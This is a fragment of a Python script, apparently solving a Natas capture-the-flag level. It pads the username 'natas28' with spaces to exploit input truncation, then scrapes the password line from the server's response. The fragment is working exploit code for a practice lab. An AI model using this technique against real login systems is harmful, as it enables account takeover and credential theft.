...
data = {"username": inject, "password": ""}

test_reponse, test_soup = send_post_request(website=website, data=data, username=username, password=password)

inject = "natas28" + " " * 57

data = {"username": inject, "password": ""}

final_response, final_soup = send_post_request(website=website, data=data, username=username, password=password, get_body=False)

content = final_soup.get_text("\n")
content = content.splitlines()

content = [c for c in content if "password" in c.lower()][0]
